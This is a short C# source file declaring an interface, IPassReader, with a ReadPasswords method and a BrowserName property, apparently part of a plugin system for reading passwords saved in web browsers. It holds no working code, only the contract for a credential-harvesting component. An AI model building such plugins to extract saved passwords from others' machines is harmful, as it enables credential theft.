using System.Collections.Generic;

namespace Plugin.Browsers
{
    interface IPassReader
    {
        IEnumerable<CredentialModel> ReadPasswords();
        string BrowserName { get; }
    }
}
